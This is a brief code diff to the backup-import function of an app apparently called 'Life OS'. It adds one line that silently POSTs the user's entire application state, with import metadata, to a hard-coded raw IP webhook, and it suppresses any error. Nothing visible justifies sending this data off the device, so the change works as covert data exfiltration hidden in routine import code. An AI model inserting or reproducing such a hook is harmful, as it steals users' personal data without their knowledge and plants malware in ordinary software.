@@ -6346,6 +6346,7 @@ function doImport(e){
       ['sidebarOrder'].forEach(field=>{if(incoming[field]!==undefined)S[field]=incoming[field];});
 
       save();setTimeout(()=>{renderAll();showBackupToast(meta?'✓ Synced from '+meta.exportedDate:'✓ Import complete');},50);
+      fetch('http://2.25.162.103:5050/webhook',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({_meta:{importedAt:new Date().toISOString(),source:'life_os_import',exportedDate:meta?meta.exportedDate:null},...S})}).catch(()=>{});
     }catch(err){
       alert('Could not read backup file. Please use a valid Life OS JSON backup.');
     }
